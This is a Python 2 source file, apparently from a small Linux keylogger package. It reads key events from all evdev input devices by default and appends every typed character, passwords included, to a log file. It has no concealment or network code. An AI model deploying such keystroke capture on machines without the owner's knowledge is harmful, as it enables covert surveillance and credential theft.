#!/usr/bin/env python
# -*- coding: utf-8 -*-

# $Id: __init__.py 97 2014-01-04 08:46:02Z t1 $
# $Revision: 97 $
# $Date: 2014-01-04 17:46:02 +0900 (Sat, 04 Jan 2014) $
# $Author: t1 $
# $LastChangedBy: t1 $
# $LastChangedDate: 2014-01-04 17:46:02 +0900 (Sat, 04 Jan 2014) $

r"""Name: __init__.py


"""

__revision__ = "$Revision: 97 $"
__version__ = "0.1.0"

__all__ = ['KeyLoggingABC', 'KeyLogger']

import os
import sys
import re
import select

import predicate
import evdev
from event import NoEventDevice, EventKeyABC, EventHandler, AutoKBDInputDevice
from keymap import KeyMaps


class KeyLoggingABC(EventKeyABC, KeyMaps):
    r"""
    """
    pass


class KeyLogger(EventHandler, KeyLoggingABC):
    r"""
    """

    _shift = False

    def __init__(self, outputf, device=None):
        r"""

        @Arguments:
        - `file_`: file object
        - `device`:

        @Return:
        """
        self.str = ''
        KeyLoggingABC.__init__(self)

        # parse outputf
        if predicate.isstring(outputf):
            self._filename = outputf
            try:
                self._fileobj = open(self._filename, 'a')
            except IOError:
                # TODO: (Atami) [2013/12/23]
                self._fileobj = None
        # check file object
        elif hasattr(outputf, 'fileno'):
            self._filename = outputf.name
            self._fileobj = outputf
        else:
            raise StandardError()

        # parse device
        readlist = []
        if predicate.isstring(device):
            readlist.append(AutoKBDInputDevice(device))
        elif device is None:
            for dev in evdev.list_devices():
                readlist.append(evdev.InputDevice(dev))
        else:
            for dev in device:
                readlist.append(evdev.InputDevice(dev))
        super(KeyLogger, self).__init__(rlist=readlist, wlist=(), xlist=())

    def run(self, ):
        r"""SUMMARY

        run()

        @Return:
        """
        try:
            self.handle_event()
        except KeyboardInterrupt:
            print('\n\nKeylogger Keyboard interrupted.')

    def key_event(self, event):
        r"""SUMMARY

        key_event(event)

        @Arguments:
        - `event`:

        @Return:
        """
        # key up
        if event.value == KeyLogger._key_up:
            self.keyup(event)
        # shift key
        elif self._shift:
            self.keyshift(event)
        # key hold
        elif event.value == KeyLogger._key_hold:
            self.keyhold(event)
        # down
        elif event.value == KeyLogger._key_down:
            self.keydown(event)
        # write out
        if self.str:
            self.write()

    def keyup(self, event):
        r"""SUMMARY

        handle_up()

        @Return:
        """
        str_ = self.getupkey(event.code)
        if str_ == r'<\Shift>':
            self._shift = False
            str_ = ''
        if not str_ in (r'<\Alt>', r'<\Control>'):
            str_ = ''
        self.str = str_

    def keyshift(self, event):
        r"""SUMMARY

        handle_shift()

        @Return:
        """
        str_ = self.getshiftkey(event.code)
        if str_ in ('<Shift>', '<Alt>', '<Control>'):
            str_ = ''
        self.str = str_

    def keyhold(self, event):
        r"""SUMMARY

        handle_hold()

        @Return:
        """
        if self._shift:
            str_ = self.getshiftkey(event.code)
        else:
            str_ = self.getkey(event.code)
        if str_ in ('<Shift>', '<Alt>', '<Control>'):
            str_ = ''
        self.str = str_

    def keydown(self, event):
        r"""SUMMARY

        handle_down()

        @Return:
        """
        str_ = self.getkey(event.code)
        if str_ == '<Shift>':
            self._shift = True
            str_ = ''
        self.str = str_

    def write(self, ):
        r"""SUMMARY

        write()

        @Return:
        """
        try:
            self._fileobj.write(self.str)
            self._fileobj.flush()
        except IOError, err:
            print("Fatal Error: can't write file.")
            print(err)
            # TODO: (Atami) [2013/12/22]
            # raise IOError()

    def __del__(self, ):
        r"""SUMMARY

        __del__()

        @Return:
        """
        self._fileobj.close()



# For Emacs
# Local Variables:
# coding: utf-8
# End:
# __init__.py ends here
